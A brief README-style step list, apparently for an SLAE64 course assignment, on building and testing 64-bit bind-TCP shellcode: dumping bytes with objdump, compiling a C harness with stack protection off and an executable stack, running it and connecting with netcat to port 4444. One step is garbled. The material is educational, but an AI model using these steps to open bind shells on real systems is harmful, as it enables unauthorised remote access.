https://securitychops.com/2019/02/02/slae64-assignment-1-shell-bind-tcp-shellcode.html

1. Compile it with compile.sh
2. Dump shellcode with **for i in $(objdump -D shell-bind.o |grep "^ " |cut -f2);do echo -n '\x'$i;done;echo**
3. Paste shellcode into shellcode.c
4. compile with: gcc shellcode.c -o shellcode -fno-stack-protector -z execstack
5. ./shellcode
6. n6. c -nv ipaddress-of-host 4444
7. done
